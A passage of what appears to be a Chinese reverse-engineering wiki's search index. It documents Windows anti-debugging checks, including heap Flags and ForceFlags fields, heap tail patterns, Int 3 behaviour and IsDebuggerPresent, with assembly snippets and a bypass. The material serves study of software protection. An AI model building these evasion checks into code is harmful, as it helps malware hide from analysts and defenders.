            "text": "\u90a3\u4e48\u663e\u7136, \u68c0\u6d4b\u8c03\u8bd5\u5668\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u68c0\u6d4b\u90a3\u51e0\u4e2a Flags \u548c ForgeFlags \u7684\u6807\u5fd7\u4f4d\u5165\u624b.   \u5148\u770b Flags \u5b57\u6bb5\u7684\u68c0\u6d4b\u4ee3\u7801, \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u7248\u672c\u5728 3.10-3.50 \u4e4b\u95f4:  call   GetVersion  cmp   al ,   6  cmc  sbb   ebx ,   ebx  and   ebx ,   34 h  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  mov   eax ,   [ eax + 18 h ]   ;get process heap base  mov   eax ,   [ eax + ebx + 0 ch ]   ;Flags  ;neither HEAP_CREATE_ALIGN_16  ;nor HEAP_SKIP_VALIDATION_CHECKS  and   eax ,   0 effeffffh  ;HEAP_GROWABLE  ;+ HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   eax ,   40000062 h  je   being_debugged   32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u4e3a 3.51 \u53ca\u66f4\u9ad8\u7248\u672c:  call   GetVersion  cmp   al ,   6  cmc  sbb   ebx ,   ebx  and   ebx ,   34 h  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  mov   eax ,   [ eax + 18 h ]   ;get process heap base  mov   eax ,   [ eax + ebx + 0 ch ]   ;Flags  ;not HEAP_SKIP_VALIDATION_CHECKS  bswap   eax  and   al ,   0 efh  ;HEAP_GROWABLE  ;+ HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  ;reversed by bswap  cmp   eax ,   62000040 h  je   being_debugged   64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7 subsystem \u7248\u672c\u56f0\u6270):  push   60 h  pop   rsi  gs: lodsq   ;Process Environment Block  mov   ebx ,   [ rax + 30 h ]   ;get process heap base  call   GetVersion  cmp   al ,   6  sbb   rax ,   rax  and   al ,   0 a4h  ;HEAP_GROWABLE  ;+ HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   d   [ rbx + rax + 70 h ],   40000062 h   ;Flags  je   being_debugged   \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883:  push   30 h  pop   eax  mov   ebx ,   fs :[ eax ]   ;Process Environment Block  ;64-bit Process Environment Block  ;follows 32-bit Process Environment Block  mov   ah ,   10 h  mov   ebx ,   [ ebx + eax ]   ;get process heap base  call   GetVersion  cmp   al ,   6  sbb   eax ,   eax  and   al ,   0 a4h  ;Flags  ;HEAP_GROWABLE  ;+ HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   [ ebx + eax + 70 h ],   40000062 h  je   being_debugged   \u5982\u679c\u662f\u76f4\u63a5\u901a\u8fc7 KUSER_SHARED_DATA \u7ed3\u6784\u7684 NtMajorVersion \u5b57\u6bb5(\u4f4d\u4e8e2G\u7528\u6237\u7a7a\u95f4\u7684 0x7ffe026c \u504f\u79fb\u5904)\u83b7\u53d6\u8be5\u503c(\u5728\u6240\u670932\u4f4d/64\u4f4d\u7248\u672c\u7684Windows\u90fd\u53ef\u4ee5\u83b7\u53d6\u8be5\u503c), \u53ef\u4ee5\u8fdb\u4e00\u6b65\u6df7\u6dc6 kernel32 \u7684 GetVersion() \u51fd\u6570\u8c03\u7528\u64cd\u4f5c.", 
            "title": "\u68c0\u6d4bFlags\u5b57\u6bb5"
        }, 
        {
            "location": "/reverse/anti-debug/heap-flags/#forgeflags", 
            "text": "\u5f53\u7136\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5c31\u662f\u68c0\u6d4b ForgeFlags \u5b57\u6bb5, \u4ee5\u4e0b\u662f32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dWindows\u73af\u5883,  subsystem \u7248\u672c\u5728 3.10-3.50 \u4e4b\u95f4:  call   GetVersion  cmp   al ,   6  cmc  sbb   ebx ,   ebx  and   ebx ,   34 h  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  mov   eax ,   [ eax + 18 h ]   ;get process heap base  mov   eax ,   [ eax + ebx + 10 h ]   ;ForceFlags  ;not HEAP_CREATE_ALIGN_16  btr   eax ,   10 h  ;HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   eax ,   40000060 h  je   being_debugged   32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u4e3a 3.51 \u53ca\u66f4\u9ad8\u7248\u672c:  call   GetVersion  cmp   al ,   6  cmc  sbb   ebx ,   ebx  and   ebx ,   34 h  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  mov   eax ,   [ eax + 18 h ]   ;get process heap base  ;ForceFlags  ;HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   [ eax + ebx + 10 h ],   40000060 h  je   being_debugged   64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7 subsystem \u7248\u672c\u56f0\u6270):  push   60 h  pop   rsi  gs: lodsq   ;Process Environment Block  mov   ebx ,   [ rax + 30 h ]   ;get process heap base  call   GetVersion  cmp   al ,   6  sbb   rax ,   rax  and   al ,   0 a4h  ;ForceFlags  ;HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   d   [ rbx + rax + 74 h ],   40000060 h  je   being_debugged  \n\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883:  call   GetVersion  cmp   al ,   6  push   30 h  pop   eax  mov   ebx ,   fs :[ eax ]   ;Process Environment Block  ;64-bit Process Environment Block  ;follows 32-bit Process Environment Block  mov   ah ,   10 h  mov   ebx ,   [ ebx + eax ]   ;get process heap base  sbb   eax ,   eax  and   al ,   0 a4h  ;ForceFlags  ;HEAP_TAIL_CHECKING_ENABLED  ;+ HEAP_FREE_CHECKING_ENABLED  ;+ HEAP_VALIDATE_PARAMETERS_ENABLED  cmp   [ ebx + eax + 74 h ],   40000060 h  je   being_debugged", 
            "title": "\u68c0\u6d4bForgeFlags\u5b57\u6bb5"
        }, 
        {
            "location": "/reverse/anti-debug/heap-flags/#_1", 
            "text": "The \"Ultimate\" Anti-Debugging Reference", 
            "title": "\u53c2\u8003\u94fe\u63a5"
        }, 
        {
            "location": "/reverse/anti-debug/the-heap/", 
            "text": "\u5806\u5728\u521d\u59cb\u5316\u65f6, \u4f1a\u68c0\u67e5\nheap flags\n, \u5e76\u89c6\u4e00\u4e9b\u6807\u5fd7\u4f4d\u7684\u6709\u65e0\u8bbe\u7f6e\u800c\u5bf9\u73af\u5883\u4f5c\u51fa\u989d\u5916\u7684\u6539\u53d8. \u50cf\nThemida\n\u5c31\u6709\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668.\n\n\n\u6bd4\u5982:\n\n\n\n\n\u5982\u679c\u8bbe\u7f6e\u4e86\nHEAP_TAIL_CHECKING_ENABLED\n\u6807\u5fd7(\u89c1\nHeap Flags\n\u8282), \u90a3\u4e48\u572832\u4f4dwindows\u4e2d\u5c31\u4f1a\u5728\u5206\u914d\u7684\u5806\u5757\u5c3e\u90e8\u9644\u52a02\u4e2a\n0xABABABAB\n(64\u4f4d\u73af\u5883\u5c31\u662f4\u4e2a).\n\n\n\u5982\u679c\u8bbe\u7f6e\u4e86\nHEAP_FREE_CHECKING_ENABLED\n(\u89c1\nHeap Flags\n\u8282)\u6807\u5fd7, \u90a3\u4e48\u5f53\u9700\u8981\u989d\u5916\u7684\u5b57\u8282\u6765\u586b\u5145\u5806\u5757\u5c3e\u90e8\u65f6, \u5c31\u4f1a\u4f7f\u7528\n0xFEEEFEEE\n(\u6216\u4e00\u90e8\u5206)\u6765\u586b\u5145\n\n\n\n\n\u90a3\u4e48, \u4e00\u79cd\u65b0\u7684\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5\u5c31\u662f\u6765\u68c0\u67e5\u8fd9\u4e9b\u503c. \n\n\n\u5806\u6307\u9488\u5df2\u77e5\n\n\n\u5982\u679c\u5df2\u77e5\u4e00\u4e2a\u5806\u6307\u9488, \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u68c0\u67e5\u5806\u5757\u91cc\u7684\u6570\u636e. \u7136\u800c\u5728\nWindows Vista\n\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u91c7\u7528\u4e86\u5806\u4fdd\u62a4\u673a\u5236(32\u4f4d/64\u4f4d\u90fd\u6709), \u4f7f\u7528\u4e86\u4e00\u4e2a\u5f02\u6216\u5bc6\u94a5\u6765\u5bf9\u5806\u5757\u5927\u5c0f\u8fdb\u884c\u4e86\u52a0\u5bc6. \u867d\u7136\u4f60\u53ef\u4ee5\u9009\u62e9\u662f\u5426\u4f7f\u7528\u5bc6\u94a5, \u4f46\u662f\u9ed8\u8ba4\u662f\u4f7f\u7528\u7684. \u800c\u4e14\u5c31\u5806\u5757\u9996\u90e8\u7684\u4f4d\u7f6e, \u5728\nWindows NT/2000/XP\n\u548c\nWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\n\u4e4b\u95f4\u4e5f\u662f\u4e0d\u76f8\u540c\u7684. \u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u5c06\nWindows\u7248\u672c\n\u4e5f\u8003\u8651\u5728\u5185. \n\n\n\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883:\n\n\n    \nxor\n \nebx\n,\n \nebx\n\n    \ncall\n \nGetVersion\n\n    \ncmp\n \nal\n,\n \n6\n\n    \nsbb\n \nebp\n,\n \nebp\n\n    \njb\n \nl1\n\n    \n;Process Environment Block\n\n    \nmov\n \neax\n,\n \nfs\n:[\nebx\n+\n30\nh\n]\n\n    \nmov\n \neax\n,\n \n[\neax\n+\n18\nh\n]\n \n;get process heap base\n\n    \nmov\n \necx\n,\n \n[\neax\n+\n24\nh\n]\n \n;check for protected heap\n\n    \njecxz\n \nl1\n\n    \nmov\n \necx\n,\n \n[\necx\n]\n\n    \ntest\n \n[\neax\n+\n4\nch\n],\n \necx\n\n    \ncmovne\n \nebx\n,\n \n[\neax\n+\n50\nh\n]\n \n;conditionally get heap key\n\n\nl1\n:\n \nmov\n \neax\n,\n \nheap\n \nptr\n\n    \nmovzx\n \nedx\n,\n \nw\n \n[\neax-8\n]\n \n;size\n\n    \nxor\n \ndx\n,\n \nbx\n\n    \nmovzx\n \necx\n,\n \nb\n \n[\neax\n+\nebp-1\n]\n \n;overhead\n\n    \nsub\n \neax\n,\n \necx\n\n    \nlea\n \nedi\n,\n \n[\nedx\n*\n8\n+\neax\n]\n\n    \nmov\n \nal\n,\n \n0\nabh\n\n    \nmov\n \ncl\n,\n \n8\n\n    \nrep\ne\n \nscasb\n\n    \nje\n \nbeing_debugged\n\n\n\n\n\n\u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883:\n\n\n    xor ebx, ebx\n    call GetVersion\n    cmp al, 6\n    sbb rbp, rbp\n    jb l1\n    ;Process Environment Block\n    mov rax, gs:[rbx+60h]\n    mov eax, [rax+30h] ;get process heap base\n    mov ecx, [rax+40h] ;check for protected heap\n    jrcxz l1\n    mov ecx, [rcx+8]\n    test [rax+7ch], ecx\n    cmovne ebx, [rax+88h] ;conditionally get heap key\nl1: mov eax, \nheap ptr\n\n    movzx edx, w [rax-8] ;size\n    xor dx, bx\n    add edx, edx\n    movzx ecx, b [rax+rbp-1] ;overhead\n    sub eax, ecx\n    lea edi, [rdx*8+rax]\n    mov al, 0abh\n    mov cl, 10h\n    repe scasb\n    je being_debugged\n\n\n\n\n\u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.\n\n\n\u5806\u6307\u9488\u672a\u77e5\n\n\n\u5982\u679c\u65e0\u6cd5\u5f97\u77e5\u5806\u6307\u9488, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\nkernel32\n\u7684\nHeapWalk()\n\u51fd\u6570\u6216\nntdll\n\u7684\nRtlWalkHeap()\n\u51fd\u6570(\u6216\u751a\u81f3\u662f\nkernel32\n\u7684\nGetCommandLine()\n\u51fd\u6570). \u8fd4\u56de\u7684\u5806\u5927\u5c0f\u7684\u503c\u4f1a\u88ab\u81ea\u52a8\u89e3\u5bc6, \u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u518d\u5173\u5fc3windows\u7684\u7248\u672c\n\n\n\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883:\n\n\n    \nmov\n \nebx\n,\n \noffset\n \nl2\n\n    \n;get a pointer to a heap block\n\n\nl1:\n \npush\n \nebx\n\n    \nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n    \npush\n \nd\n \n[\neax\n+\n18\nh\n]\n \n;save process heap base\n\n    \ncall\n \nHeapWalk\n\n    \ncmp\n \nw\n \n[\nebx\n+\n0\nah\n],\n \n4\n \n;find allocated block\n\n    \njne\n \nl1\n\n    \nmov\n \nedi\n,\n \n[\nebx\n]\n \n;data pointer\n\n    \nadd\n \nedi\n,\n \n[\nebx\n+\n4\n]\n \n;data size\n\n    \nmov\n \nal\n,\n \n0\nabh\n\n    \npush\n \n8\n\n    \npop\n \necx\n\n    \nrep\ne\n \nscasb\n\n    \nje\n \nbeing_debugged\n\n    \n...\n\n\nl2:\n \ndb\n \n1\nch\n \ndup\n \n(\n0\n)\n \n;sizeof(PROCESS_HEAP_ENTRY)\n\n\n\n\n\n\u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883:\n\n\n    \nmov\n \nrbx\n,\n \noffset\n \nl2\n\n    \n;get a pointer to a heap block\n\n\nl1:\n \npush\n \nrbx\n\n    \npop\n \nrdx\n\n    \npush\n \n60\nh\n\n    \npop\n \nrsi\n\n    \ngs:\nlodsq\n \n;Process Environment Block\n\n    \n;get a pointer to process heap base\n\n    \nmov\n \necx\n,\n \n[\nrax\n+\n30\nh\n]\n\n    \ncall\n \nHeapWalk\n\n    \ncmp\n \nw\n \n[\nrbx\n+\n0\neh\n],\n \n4\n \n;find allocated block\n\n    \njne\n \nl1\n\n    \nmov\n \nedi\n,\n \n[\nrbx\n]\n \n;data pointer\n\n    \nadd\n \nedi\n,\n \n[\nrbx\n+\n8\n]\n \n;data size\n\n    \nmov\n \nal\n,\n \n0\nabh\n\n    \npush\n \n10\nh\n\n    \npop\n \nrcx\n\n    \nrep\ne\n \nscasb\n\n    \nje\n \nbeing_debugged\n\n    \n...\n\n\nl2:\n \ndb\n \n28\nh\n \ndup\n \n(\n0\n)\n \n;sizeof(PROCESS_HEAP_ENTRY)\n\n\n\n\n\n\u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.", 
            "title": "The Heap"
        }, 
        {
            "location": "/reverse/anti-debug/the-heap/#_1", 
            "text": "\u5982\u679c\u5df2\u77e5\u4e00\u4e2a\u5806\u6307\u9488, \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u68c0\u67e5\u5806\u5757\u91cc\u7684\u6570\u636e. \u7136\u800c\u5728 Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u91c7\u7528\u4e86\u5806\u4fdd\u62a4\u673a\u5236(32\u4f4d/64\u4f4d\u90fd\u6709), \u4f7f\u7528\u4e86\u4e00\u4e2a\u5f02\u6216\u5bc6\u94a5\u6765\u5bf9\u5806\u5757\u5927\u5c0f\u8fdb\u884c\u4e86\u52a0\u5bc6. \u867d\u7136\u4f60\u53ef\u4ee5\u9009\u62e9\u662f\u5426\u4f7f\u7528\u5bc6\u94a5, \u4f46\u662f\u9ed8\u8ba4\u662f\u4f7f\u7528\u7684. \u800c\u4e14\u5c31\u5806\u5757\u9996\u90e8\u7684\u4f4d\u7f6e, \u5728 Windows NT/2000/XP \u548c Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c \u4e4b\u95f4\u4e5f\u662f\u4e0d\u76f8\u540c\u7684. \u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u5c06 Windows\u7248\u672c \u4e5f\u8003\u8651\u5728\u5185.   \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883:       xor   ebx ,   ebx \n     call   GetVersion \n     cmp   al ,   6 \n     sbb   ebp ,   ebp \n     jb   l1 \n     ;Process Environment Block \n     mov   eax ,   fs :[ ebx + 30 h ] \n     mov   eax ,   [ eax + 18 h ]   ;get process heap base \n     mov   ecx ,   [ eax + 24 h ]   ;check for protected heap \n     jecxz   l1 \n     mov   ecx ,   [ ecx ] \n     test   [ eax + 4 ch ],   ecx \n     cmovne   ebx ,   [ eax + 50 h ]   ;conditionally get heap key  l1 :   mov   eax ,   heap   ptr \n     movzx   edx ,   w   [ eax-8 ]   ;size \n     xor   dx ,   bx \n     movzx   ecx ,   b   [ eax + ebp-1 ]   ;overhead \n     sub   eax ,   ecx \n     lea   edi ,   [ edx * 8 + eax ] \n     mov   al ,   0 abh \n     mov   cl ,   8 \n     rep e   scasb \n     je   being_debugged   \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883:      xor ebx, ebx\n    call GetVersion\n    cmp al, 6\n    sbb rbp, rbp\n    jb l1\n    ;Process Environment Block\n    mov rax, gs:[rbx+60h]\n    mov eax, [rax+30h] ;get process heap base\n    mov ecx, [rax+40h] ;check for protected heap\n    jrcxz l1\n    mov ecx, [rcx+8]\n    test [rax+7ch], ecx\n    cmovne ebx, [rax+88h] ;conditionally get heap key\nl1: mov eax,  heap ptr \n    movzx edx, w [rax-8] ;size\n    xor dx, bx\n    add edx, edx\n    movzx ecx, b [rax+rbp-1] ;overhead\n    sub eax, ecx\n    lea edi, [rdx*8+rax]\n    mov al, 0abh\n    mov cl, 10h\n    repe scasb\n    je being_debugged  \u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.", 
            "title": "\u5806\u6307\u9488\u5df2\u77e5"
        }, 
        {
            "location": "/reverse/anti-debug/the-heap/#_2", 
            "text": "\u5982\u679c\u65e0\u6cd5\u5f97\u77e5\u5806\u6307\u9488, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32 \u7684 HeapWalk() \u51fd\u6570\u6216 ntdll \u7684 RtlWalkHeap() \u51fd\u6570(\u6216\u751a\u81f3\u662f kernel32 \u7684 GetCommandLine() \u51fd\u6570). \u8fd4\u56de\u7684\u5806\u5927\u5c0f\u7684\u503c\u4f1a\u88ab\u81ea\u52a8\u89e3\u5bc6, \u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u518d\u5173\u5fc3windows\u7684\u7248\u672c  \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883:       mov   ebx ,   offset   l2 \n     ;get a pointer to a heap block  l1:   push   ebx \n     mov   eax ,   fs :[ 30 h ]   ;Process Environment Block \n     push   d   [ eax + 18 h ]   ;save process heap base \n     call   HeapWalk \n     cmp   w   [ ebx + 0 ah ],   4   ;find allocated block \n     jne   l1 \n     mov   edi ,   [ ebx ]   ;data pointer \n     add   edi ,   [ ebx + 4 ]   ;data size \n     mov   al ,   0 abh \n     push   8 \n     pop   ecx \n     rep e   scasb \n     je   being_debugged \n     ...  l2:   db   1 ch   dup   ( 0 )   ;sizeof(PROCESS_HEAP_ENTRY)   \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883:       mov   rbx ,   offset   l2 \n     ;get a pointer to a heap block  l1:   push   rbx \n     pop   rdx \n     push   60 h \n     pop   rsi \n     gs: lodsq   ;Process Environment Block \n     ;get a pointer to process heap base \n     mov   ecx ,   [ rax + 30 h ] \n     call   HeapWalk \n     cmp   w   [ rbx + 0 eh ],   4   ;find allocated block \n     jne   l1 \n     mov   edi ,   [ rbx ]   ;data pointer \n     add   edi ,   [ rbx + 8 ]   ;data size \n     mov   al ,   0 abh \n     push   10 h \n     pop   rcx \n     rep e   scasb \n     je   being_debugged \n     ...  l2:   db   28 h   dup   ( 0 )   ;sizeof(PROCESS_HEAP_ENTRY)   \u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.", 
            "title": "\u5806\u6307\u9488\u672a\u77e5"
        }, 
        {
            "location": "/reverse/anti-debug/int-3/", 
            "text": "\u65e0\u8bba\u4f55\u65f6\u89e6\u53d1\u4e86\u4e00\u4e2a\u8f6f\u4ef6\u4e2d\u65ad\u5f02\u5e38, \u5f02\u5e38\u5730\u5740\u4ee5\u53caEIP\u5bc4\u5b58\u5668\u7684\u503c\u90fd\u4f1a\u540c\u65f6\u6307\u5411\u4ea7\u751f\u5f02\u5e38\u7684\u4e0b\u4e00\u53e5\u6307\u4ee4. \u4f46\u65ad\u70b9\u5f02\u5e38\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u7279\u4f8b. \n\n\n\u5f53\nEXCEPTION_BREAKPOINT(0x80000003)\n\u5f02\u5e38\u89e6\u53d1\u65f6, Windows\u4f1a\u8ba4\u5b9a\u8fd9\u662f\u7531\u5355\u5b57\u8282\u7684\"\nCC\n\"\u64cd\u4f5c\u7801(\u4e5f\u5373\nInt 3\n\u6307\u4ee4)\u9020\u6210\u7684. Windows\u9012\u51cf\u5f02\u5e38\u5730\u5740\u4ee5\u6307\u5411\u6240\u8ba4\u5b9a\u7684\"\nCC\n\"\u64cd\u4f5c\u7801, \u968f\u540e\u4f20\u9012\u8be5\u5f02\u5e38\u7ed9\u5f02\u5e38\u5904\u7406\u53e5\u67c4. \u4f46\u662fEIP\u5bc4\u5b58\u5668\u7684\u503c\u5e76\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316. \n\n\n\u56e0\u6b64, \u5982\u679c\u4f7f\u7528\u4e86 \nCD 03\n\uff08\u8fd9\u662f \nInt 03\n \u7684\u673a\u5668\u7801\u8868\u793a\uff09\uff0c\u90a3\u4e48\u5f53\u5f02\u5e38\u5904\u7406\u53e5\u67c4\u63a5\u53d7\u63a7\u5236\u65f6, \u5f02\u5e38\u5730\u5740\u662f\u6307\u5411 \n03\n \u7684\u4f4d\u7f6e.", 
            "title": "Interrupt 3"
        }, 
        {
            "location": "/reverse/anti-debug/isdebuggerpresent/", 
            "text": "\u5173\u4e8eIsDebuggerPresent\n\n\n\u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \nkernel32\n\u7684\nIsDebuggerPresent()\n\u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\n\u975e0\u503c\n. \n\n\nBOOL\n \nWINAPI\n \nIsDebuggerPresent\n(\nvoid\n);\n\n\n\n\n\n\u68c0\u6d4b\u4ee3\u7801\n\n\n\u5b83\u7684\u68c0\u6d4b\u65b9\u6cd5\u975e\u5e38\u7b80\u5355, \u6bd4\u5982\u7528\u4ee5\u4e0b\u4ee3\u7801(32\u4f4d\u8fd8\u662f64\u4f4d\u90fd\u662f\u76f8\u540c\u7684\u8fd9\u4efd\u4ee3\u7801)\u572832\u4f4d/64\u4f4d\u73af\u5883\u4e2d\u68c0\u6d4b:\n\n\ncall\n \nIsDebuggerPresent\n\n\ntest\n \nal\n,\n \nal\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u5b9e\u9645\u4e0a, \u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u5355\u7eaf\u5730\u8fd4\u56de\u4e86\nBeingDebugged\n\u6807\u5fd7\u7684\u503c. \u68c0\u67e5\nBeingDebugged\n\u6807\u5fd7\u4f4d\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4ee3\u7801\u4f4d\u4ee3\u7801\u68c0\u67e532\u4f4d\u73af\u5883\u6765\u5b9e\u73b0:\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\ncmp\n \nb\n \n[\neax\n+\n2\n],\n \n0\n \n;check BeingDebugged\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u6216\u4f7f\u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\n\n\npush\n \n60\nh\n\n\npop\n \nrsi\n\n\ngs:\nlodsq\n \n;Process Environment Block\n\n\ncmp\n \nb\n \n[\nrax\n+\n2\n],\n \n0\n \n;check BeingDebugged\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\n\n\nmov\n \neax\n,\n \nfs\n:[\n30\nh\n]\n \n;Process Environment Block\n\n\n;64-bit Process Environment Block\n\n\n;follows 32-bit Process Environment Block\n\n\ncmp\n \nb\n \n[\neax\n+\n1002\nh\n],\n \n0\n \n;check BeingDebugged\n\n\njne\n \nbeing_debugged\n\n\n\n\n\n\u5982\u4f55\u7ed5\u8fc7\n\n\n\u60f3\u8981\u514b\u670d\u8fd9\u4e9b\u68c0\u6d4b, \u53ea\u9700\u8981\u5c06\nBeingDebugged\n\u6807\u5fd7\u8bbe\u4e3a\n0\n\u5373\u53ef(\u6216\u6539\u53d8\u4e00\u4e0b\u8fd4\u56de\u503c).", 
            "title": "IsDebuggerPresent"
        }, 
        {
            "location": "/reverse/anti-debug/isdebuggerpresent/#isdebuggerpresent", 
            "text": "\u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6,  kernel32 \u7684 IsDebuggerPresent() \u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a \u975e0\u503c .   BOOL   WINAPI   IsDebuggerPresent ( void );", 
            "title": "\u5173\u4e8eIsDebuggerPresent"
        }, 
        {
            "location": "/reverse/anti-debug/isdebuggerpresent/#_1", 
            "text": "\u5b83\u7684\u68c0\u6d4b\u65b9\u6cd5\u975e\u5e38\u7b80\u5355, \u6bd4\u5982\u7528\u4ee5\u4e0b\u4ee3\u7801(32\u4f4d\u8fd8\u662f64\u4f4d\u90fd\u662f\u76f8\u540c\u7684\u8fd9\u4efd\u4ee3\u7801)\u572832\u4f4d/64\u4f4d\u73af\u5883\u4e2d\u68c0\u6d4b:  call   IsDebuggerPresent  test   al ,   al  jne   being_debugged   \u5b9e\u9645\u4e0a, \u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u5355\u7eaf\u5730\u8fd4\u56de\u4e86 BeingDebugged \u6807\u5fd7\u7684\u503c. \u68c0\u67e5 BeingDebugged \u6807\u5fd7\u4f4d\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4ee3\u7801\u4f4d\u4ee3\u7801\u68c0\u67e532\u4f4d\u73af\u5883\u6765\u5b9e\u73b0:  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  cmp   b   [ eax + 2 ],   0   ;check BeingDebugged  jne   being_debugged   \u6216\u4f7f\u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883  push   60 h  pop   rsi  gs: lodsq   ;Process Environment Block  cmp   b   [ rax + 2 ],   0   ;check BeingDebugged  jne   being_debugged   \u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883  mov   